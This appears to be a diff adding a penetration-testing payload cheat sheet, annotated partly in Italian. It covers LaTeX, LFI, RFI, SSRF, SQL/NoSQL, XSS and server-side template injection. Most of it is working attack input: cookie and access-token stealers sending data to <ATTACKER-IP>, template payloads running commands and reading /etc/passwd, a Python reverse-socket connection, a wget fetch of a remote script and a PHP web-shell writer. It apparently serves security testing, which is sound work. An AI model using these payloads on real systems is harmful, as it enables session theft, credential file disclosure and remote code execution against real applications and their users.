@@ -1,0 +1,425 @@
+==> LATEX
+== Latex: Read File
+\input{/etc/passwd}
+\lstinputlisting{/etc/passwd}
+\verbatiminput{/etc/passwd}
+
+== Latex: Write file
+\newwrite\outfile
+\openout\outfile=cmd.tex
+\write\outfile{Hello-world}
+\closeout\outfile
+
+== Latex: Command execution
+\immediate\write18{env > output}
+\input{output}
+\input{|"/bin/hostname"}
+\input{|"extractbb /etc/passwd > /tmp/b.tex"}
+\immediate\write18{env | base64 > test.tex}
+\input{text.tex}
+\input|ls|base4
+\input{|"/bin/hostname"}
+
+
+
+
+
+==> LFI
+== Check Win
+/../../../../../../../../../windows/system32/drivers/etc/hosts
+/../../../../../../../../../windows/system32/config/SAM
+../../../../../../../../../windows/system32/config/SAM
+../../../../../../../../../windows/system32/drivers/etc/hosts
+C:\Windows\System32\config\SAM
+c:\windows\system32\drivers\etc\hosts
+<iframe src=C:\Windows\System32\config\SAM heigh=500 width=500></iframe>
+<iframe src=c:\windows\system32\drivers\etc\hosts heigh=500 width=500></iframe>
+
+== Check Linux
+/etc/passwd
+../../../../../../../../etc/passwd
+file../../../../../../../../etc/passwd
+file:///etc/passwd
+file://etc/passwd
+<iframe src=/etc/passwd height=500 width=500></iframe>
+<iframe src=/etc/passwd+height=500+width=500></iframe>
+
+== Null byte (../../../../etc/passwd%00 viene realizzato con lo script python quindi non lo aggiungo alla lista)
+
+== Double encoding
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+
+== UTF-8 encoding
+%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+%E2%80%A5/%E2%80%A5/%E2%80%A5/%E2%80%A5/%E2%80%A5/%E2%80%A5/%E2%80%A5/etc/passwd
+%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/etc/passwd
+..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc..%2fpasswd
+
+== Path and dot truncation
+../../../etc/passwd.................................
+../../../etc/passwd\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.
+../../../etc/passwd/./././././././././././././././././././././././. 
+
+== Filter bypass tricks
+....//....//....//....//....//....//....//....//....//....//etc/passwd
+..///////..////..//////..///////..////..//////..///////..////..//////..///////..////..//////etc/passwd
+/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
+
+
+
+
+==>  RFI
+http://<ATTACKER-IP>/rfi.txt
+hTTp://<ATTACKER-IP>/rfi.txt
+== UTF-8 encoding
+http:%2f/%2FATTACKER-IP>%2frfi.txt
+== Double encoding
+http:%252f%252f<ATTACKER-IP>%252frfi.txt
+
+== Attivazione RFI via FTP
+ftp://<ATTACKER-IP>/rfi.txt
+== UTF-8 encoding
+ftp:%2f/%2FATTACKER-IP>%2frfi.txt
+== Double encoding
+ftp:%252f%252f<ATTACKER-IP>%252frfi.txt
+
+== Attivazione RFI via SMB
+\\<ATTACKER-IP>\share
+
+
+
+
+==> SSRF
+== verifico SSRF
+http://<ATTACKER-IP>
+http://127.1
+http://localhost.myDomain.com
+http://127.0.0.1.nip.io
+http://targetDomain.ctf.127.0.0.1.nip.io
+http://targetDomain.ctf.127.1
+myValue <img/src="https://<ATTACKER-IP>">
+myValue <iframe/src="https://<ATTACKER-IP>">
+
+== raccolta dati
+http://127.0.0.1
+http://127.0.0.1:8080
+file:///etc/passwd
+myValue <img/src="http://127.0.0.1">
+myValue <iframe/src="http://127.0.0.1">
+myValue <iframe/src="http://localhost">
+myValue <iframe/src="file:///etc/passwd">
+
+== sistemi di backned
+http://192.168.0.1/admin
+http://192.168.1.1/admin
+
+
+
+
+
+==> SQL-injection:
+'
+)'
+))'
+"
+`
+')
+")
+`)
+'))
+"))
+`))
+'-SLEEP(30);
+
+== UTF-8 encoding
+%EF%BC%87 or %EF%BC%87 1 %EF%BC%87 = %EF%BC%87 1
+%EF%BC%82 or %EF%BC%82 1 %EF%BC%82 = %EF%BC%82 1
+admin'  %EF%B9%A3 %EF%B9%A3%EF%B9%A3
+
+==> SQL-injection con JSON
+"
+/"
+
+==> NoSQL-injection
+{"username":{"$ne":null},"password":{"$ne":null}}
+== UTF-8 encoding
+{%EF%BC%82username%EF%BC%82:{%EF%BC%82$ne%EF%BC%82:null},%EF%BC%82password%EF%BC%82:{%EF%BC%82$ne%EF%BC%82:null}}
+
+
+
+ 
+
+==> XSS injection
+<script>var x;x=document.cookie; document.location.replace('http://<ATTACKER-IP>/c=1&cc='+x)</script>
+<ScRIpt>var x;x=document.cookie; document.location.replace('http://<ATTACKER-IP>/c=1&cc='+x)</scrIPt>
+<script>var x;x=document.cookie; document.location.replace('http://<ATTACKER-IP>/c=1&cc='+x)</script><script>var x;x=document.cookie; document.location.replace('http://<ATTACKER-IP>/c=1&cc='+x)</script>
+<u/onmouseover="var x;x=document.cookie; document.location.replace('http://<ATTACKER-IP>/c=1&cc='+x)";//>hello
+<img src=x onerror=""var x;x=document.cookie; document.location.replace('http://<ATTACKER-IP>/c=1&cc='+x)""//
+<scr<script>ipt>var x;x=document.cookie; document.location.replace('http://<ATTACKER-IP>/c=1&cc='+x)</scr</script>ipt>
+<script>var x;x=localStorage.getItem('access_token'); document.location.replace('http://<ATTACKER-IP>/c=2&cc='+x)</script>
+<script>document.location='http://<ATTACKER-IP>/?c=3&cc='+btoa(document.cookie)</script>
+<script>document.location='http://<ATTACKER-IP>/?c=4&cc='+btoa(localStorage.getItem('access_token'))</script>
+<img style="display: none;" src=x onerror="fetch('http://<ATTACKER-IP>/?c=6&cc='+btoa(document.cookie))">
+<iframe style="display:none" src=javascript:void(document.location="http://<ATTACKER-IP>/?c=7&cc='+document.cookie)></iframe>
+"><script> var x;x=document.cookie; document.location.replace('http://<ATTACKER-IP>/c=8&cc='+x)</script>
+<sCriPt> var x;x=document.cookie; document.location.replace('http://<ATTACKER-IP>/c=9&cc='+x)</scRIpT>
+<script x> var x;x=document.cookie; document.location.replace('http://<ATTACKER-IP>/c=10&cc='+x)</script>
+<scr<script>ipt> var x;x=document.cookie; document.location.replace('http://<ATTACKER-IP>/c=11&cc='+x)</scr<script>ipt>
+<script> var x;x=\u0064ocument.\u0063ookie; \u0064ocument.location.replace('http://<ATTACKER-IP>/c=12&cc='+x)</script>
+<img style="display: none;" src=x oneonerrorrror="fetch('http://<ATTACKER-IP>/?c=13&cc='+btoa(document.cookie))">
+"><img style="display: none;" src=x onerror="fetch('http://<ATTACKER-IP>/?c=14&cc='+btoa(document.cookie))">
+<svg onload="fetch('http://<ATTACKER-IP>/?c=15&cc='+btoa(document.cookie))">
+<svg onload="fetch('http://<ATTACKER-IP>/?c=16&cc='+btoa(\u0064ocument.cookie))">
+<svg onlonloadoad="fetch('http://<ATTACKER-IP>/?c=17&cc='+btoa(document.cookie))">
+"><svg onload="fetch('http://<ATTACKER-IP>/?c=18&cc='+btoa(document.cookie))">
+<div onpointerover="fetch('http://<ATTACKER-IP>/?c=19&cc='+btoa(document.cookie))">MOVE HERE</div>
+<div onpointerover="fetch('http://<ATTACKER-IP>/?c=20&cc='+btoa(\u0064ocument.cookie))">MOVE HERE</div>
+"><div onpointerover="fetch('http://<ATTACKER-IP>/?c=21&cc='+btoa(document.cookie))">MOVE HERE</div>
+<div onpoonpointeroverinterover="fetch('http://<ATTACKER-IP>/?c=22&cc='+btoa(document.cookie))">MOVE HERE</div>
+<body onload="fetch('http://<ATTACKER-IP>/?c=23&cc='+btoa(document.cookie))">
+<body onload="fetch('http://<ATTACKER-IP>/?c=24&cc='+btoa(\u0064ocument.cookie))">
+"><body onload="fetch('http://<ATTACKER-IP>/?c=25&cc='+btoa(document.cookie))"> 
+<body ononloadload="fetch('http://<ATTACKER-IP>/?c=26&cc='+btoa(document.cookie))">
+
+
+
+
+== UTF-8 encoding
+%EF%BC%9Cscript%EF%BC%9Ealert('xss');%EF%BC%9C/script%EF%BC%9E
+
+
+==> SSTI
+${{<%[%'"}}%\.
+===> Razor (ASP.NET)
+== basic injection
+@(1+2)
+
+===> WebForms (ASP.NET)
+== basic injection
+<%= 7*7 %>
+<% Response.Write(7*7); %>
+
+===> Ruby (ruby)
+== basic injections
+<%= 7 * 7 %>
+#{ 7 * 7 }
+== Ruby - Retrieve /etc/passwd
+<%= File.open('/etc/passwd').read %>
+== Ruby - List files and directories
+<%= Dir.entries('/') %>
+== Ruby - Code execution
+<%= system('cat /etc/passwd') %>
+<%= `ls /` %>
+<%= IO.popen('ls /').readlines()  %>
+<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
+<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
+== Execute code using SSTI for Slim engine.
+#{ %x|env| }
+
+===> Mako (python)
+<% import os %>${os.popen('ping <ATTACKER-IP>').read()} 
+== Direct access to os from TemplateNamespace:
+${self.module.cache.util.os.system("ping <ATTACKER-IP>")}
+${self.module.runtime.util.os.system("ping <ATTACKER-IP>")}
+${self.template.module.cache.util.os.system("ping <ATTACKER-IP>")}
+${self.module.cache.compat.inspect.os.system("ping <ATTACKER-IP>")}
+${self.__init__.__globals__['util'].os.system('ping <ATTACKER-IP>')}
+${self.template.module.runtime.util.os.system("ping <ATTACKER-IP>")}
+${self.module.filters.compat.inspect.os.system("ping <ATTACKER-IP>")}
+${self.module.runtime.compat.inspect.os.system("ping <ATTACKER-IP>")}
+${self.module.runtime.exceptions.util.os.system("ping <ATTACKER-IP>")}
+${self.template.__init__.__globals__['os'].system('ping <ATTACKER-IP>')}
+${self.module.cache.util.compat.inspect.os.system("ping <ATTACKER-IP>")}
+${self.module.runtime.util.compat.inspect.os.system("ping <ATTACKER-IP>")}
+${self.template._mmarker.module.cache.util.os.system("ping <ATTACKER-IP>")}
+${self.template.module.cache.compat.inspect.os.system("ping <ATTACKER-IP>")}
+${self.module.cache.compat.inspect.linecache.os.system("ping <ATTACKER-IP>")}
+${self.template._mmarker.module.runtime.util.os.system("ping <ATTACKER-IP>")}
+${self.attr._NSAttr__parent.module.cache.util.os.system("ping <ATTACKER-IP>")}
+${self.template.module.filters.compat.inspect.os.system("ping <ATTACKER-IP>")}
+${self.template.module.runtime.compat.inspect.os.system("ping <ATTACKER-IP>")}
+${self.module.filters.compat.inspect.linecache.os.system("ping <ATTACKER-IP>")}
+${self.module.runtime.compat.inspect.linecache.os.system("ping <ATTACKER-IP>")}
+${self.template.module.runtime.exceptions.util.os.system("ping <ATTACKER-IP>")}
+${self.attr._NSAttr__parent.module.runtime.util.os.system("ping <ATTACKER-IP>")}
+${self.context._with_template.module.cache.util.os.system("ping <ATTACKER-IP>")}
+${self.module.runtime.exceptions.compat.inspect.os.system("ping <ATTACKER-IP>")}
+${self.template.module.cache.util.compat.inspect.os.system("ping <ATTACKER-IP>")}
+${self.context._with_template.module.runtime.util.os.system("ping <ATTACKER-IP>")}
+${self.module.cache.util.compat.inspect.linecache.os.system("ping <ATTACKER-IP>")}
+${self.template.module.runtime.util.compat.inspect.os.system("ping <ATTACKER-IP>")}
+${self.module.runtime.util.compat.inspect.linecache.os.system("ping <ATTACKER-IP>")}
+${self.module.runtime.exceptions.traceback.linecache.os.system("ping <ATTACKER-IP>")}
+${self.module.runtime.exceptions.util.compat.inspect.os.system("ping <ATTACKER-IP>")}
+${self.template._mmarker.module.cache.compat.inspect.os.system("ping <ATTACKER-IP>")}
+${self.template.module.cache.compat.inspect.linecache.os.system("ping <ATTACKER-IP>")}
+${self.attr._NSAttr__parent.template.module.cache.util.os.system("ping <ATTACKER-IP>")}
+${self.template._mmarker.module.filters.compat.inspect.os.system("ping <ATTACKER-IP>")}
+${self.template._mmarker.module.runtime.compat.inspect.os.system("ping <ATTACKER-IP>")}
+${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system("ping <ATTACKER-IP>")}
+${self.template._mmarker.module.runtime.exceptions.util.os.system("ping <ATTACKER-IP>")}
+${self.template.module.filters.compat.inspect.linecache.os.system("ping <ATTACKER-IP>")}
+${self.template.module.runtime.compat.inspect.linecache.os.system("ping <ATTACKER-IP>")}
+${self.attr._NSAttr__parent.template.module.runtime.util.os.system("ping <ATTACKER-IP>")}
+${self.context._with_template._mmarker.module.cache.util.os.system("ping <ATTACKER-IP>")}
+${self.template.module.runtime.exceptions.compat.inspect.os.system("ping <ATTACKER-IP>")}
+${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system("ping <ATTACKER-IP>")}
+${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system("ping <ATTACKER-IP>")}
+${self.context._with_template.module.cache.compat.inspect.os.system("ping <ATTACKER-IP>")}
+${self.module.runtime.exceptions.compat.inspect.linecache.os.system("ping <ATTACKER-IP>")}
+${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system("ping <ATTACKER-IP>")}
+${self.context._with_template._mmarker.module.runtime.util.os.system("ping <ATTACKER-IP>")}
+${self.context._with_template.module.filters.compat.inspect.os.system("ping <ATTACKER-IP>")}
+${self.context._with_template.module.runtime.compat.inspect.os.system("ping <ATTACKER-IP>")}
+${self.context._with_template.module.runtime.exceptions.util.os.system("ping <ATTACKER-IP>")}
+${self.template.module.runtime.exceptions.traceback.linecache.os.system("ping <ATTACKER-IP>")}
+ 
+===> Jinjava (Python)
+== Jinjava - Basic injection
+{{'a'.toUpperCase()}}
+{{ request }} 
+```
+== Jinjava - Command execution
+${"".getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("ping <ATTACKER-IP>").getInputStream().read()}
+{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"ping <ATTACKER-IP>\\\"); x.start()\")}}
+{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"ping <ATTACKER-IP>\\\"); 
+{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"ping\\\",\\\"<ATTACKER-IP>\\\"); 
+
+===> Jinja2 (Python):
+== Jinja2 - Basic injection
+{{4*4}}
+[[5*5]]
+{{7*'7'}}
+{{config.items()}}
+== Jinja2 - Read remote file
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}
+{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
+== Jinja2 - Write into remote file
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/hello.txt', 'w').write('Hello here !') }}
+== Exploit the SSTI by calling os.popen().read()
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
+{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
+{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
+{{ cycler.__init__.__globals__.os.popen('id').read() }}
+{{ joiner.__init__.__globals__.os.popen('id').read() }}
+{{ namespace.__init__.__globals__.os.popen('id').read() }}
+== Exploit the SSTI by calling subprocess.Popen
+{{''.__class__.mro()[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}
+{{config.__class__.__init__.__globals__['os'].popen('/etc/passwd').read()}}
+== Exploit the SSTI by calling Popen without guessing the offset
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<ATTACKER-IP>\",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
+
+===> Twig (PHP):
+== Twig - Basic injection
+{{7*7}}
+{{7*'7'}}
+{{dump(app)}}
+{{app.request.server.all|join(',')}}
+{{ _self.env.getRuntime('Symfony\\Component\\Process\\Process').import('id').getOutput() }} 
+== Twig - Arbitrary File Reading
+"{{'/etc/passwd'|file_excerpt(1,30)}}"@
+== Twig - Code execution
+{{self}}
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{['id']|filter('system')}}
+{{['cat\x20/etc/passwd']|filter('system')}}
+{{['cat$IFS/etc/passwd']|filter('system')}}
+
+===> Smarty (PHP):
+{$smarty.version}
+{php} echo system('id'); {/php}
+{php}echo `id`;{/php}
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
+{system('ls')}
+{system('cat index.php')}
+
+===> JAVA
+== Java - Basic injection
+${7*7}
+${{7*7}}
+${class.getClassLoader()}
+${class.getResource("").getPath()}
+${class.getResource("../index.htm").getContent()}
+${class.getResource("../../index.htm").getContent()}
+${class.getResource("../../../index.htm").getContent()}
+${class.getResource("../../../../../index.htm").getContent()}
+${class.getResource("../../../../../../index.htm").getContent()}
+== Java - Retrieve the system’s environment variables
+${T(java.lang.System).getenv()}
+== Java - Retrieve /etc/passwd
+${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
+
+===> FreeMarker (Java):
+${7*7}
+#{3*3}
+${"freemarker.template.utility.Execute"?new()("id")}
+== Freemarker - Read File
+${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
+== Freemarker - Code execution
+<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
+[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
+${"freemarker.template.utility.Execute"?new()("id")}
+
+===> Velocity (Java):
+$math.evaluate( "7*7" )
+#set( $rubbish = $Runtime.getRuntime().exec("id").getInputStream() )
+#set($e=$Runtime.getRuntime().exec("id"))$e.getInputStream().getText("UTF-8")
+#set($str=$class.inspect("java.lang.String").type)
+#set($chr=$class.inspect("java.lang.Character").type)
+#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("ping <ATTACKER-IP>"))
+
+
+===> Expression Language EL 
+== Expression Language EL - Basic injection
+${1+1}
+#{1+1}
+== DNS Lookup
+${"".getClass().forName("java.net.InetAddress").getMethod("getByName","".getClass()).invoke("","<ATTACKER-IP>")}
+== JVM System Property Lookup (ex: java.class.path)
+${"".getClass().forName("java.lang.System").getDeclaredMethod("getProperty","".getClass()).invoke("","java.class.path")}
+== Method using Runtime
+#{session.setAttribute("rtc","".getClass().forName("java.lang.Runtime").getDeclaredConstructors()[0])}
+#{session.getAttribute("rtc").setAccessible(true)}
+#{session.getAttribute("rtc").getRuntime().exec("/bin/bash -c whoami")}
+== Method using processbuilder
+${request.setAttribute("c","".getClass().forName("java.util.ArrayList").newInstance())}
+${request.getAttribute("c").add("cmd.exe")}
+${request.getAttribute("c").add("/k")}
+${request.getAttribute("c").add("ping <ATTACKER-IP>")}
+${request.setAttribute("a","".getClass().forName("java.lang.ProcessBuilder").getDeclaredConstructors()[0].newInstance(request.getAttribute("c")).start())}
+${request.getAttribute("a")}
+== Method using ScriptEngineManager one-liner
+${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"ping <ATTACKER-IP>\\\")"))}
+== Method using ScriptEngineManager
+${facesContext.getExternalContext().setResponseHeader("output","".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval(\"var x=new java.lang.ProcessBuilder;x.command(\\\"wget\\\",\\\"http://<ATTACKER-IP>/1.sh\\\");org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"))}
+ 
+===> Thymeleaf (Java):
+${#exec('id').getOutput()}
+@{${#servletContext.getClass().forName('java.lang.Runtime').getRuntime().exec('id').getInputStream().getText('UTF-8')}}
+
+===> Grovy (Grovy Java)
+[Official website](https://groovy-lang.org/)
+== Groovy - Basic injection
+${9*9}
+== Groovy - Read and create File
+${String x = new File('c:\windows\system32\drivers\etc\hosts').text}
+${String x = new File('c:\windows\system32\drivers\etc\hosts').getText('UTF-8')}
+${new File("C:\Temp\FileName.txt").createNewFile();}
+== Groovy - HTTP request:
+${"http://<ATTACKER-IP>".toURL().text}
+${new URL("http://<ATTACKER-IP>").getText()}
+== Groovy - Command Execution
+${"ping <ATTACKER-IP>".exec()}
+${"ping <ATTACKER-IP>".execute()}
+${this.evaluate("9*9")}
+${new org.codehaus.groovy.runtime.MethodClosure("ping <ATTACKER-IP>","execute").call()}
+== Groovy - Sandbox Bypass
+${ @ASTTest(value={assert java.lang.Runtime.getRuntime().exec("ping <ATTACKER-IP>")})
+def x }
+${ new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"ping <ATTACKER-IP>\")})def x") }
+
+===> Jade/Pug (JavaScript):
+#{7*7}
+- var x = function(){ return require('child_process').exec('id', function(error, stdout, stderr) { return stdout; }); };
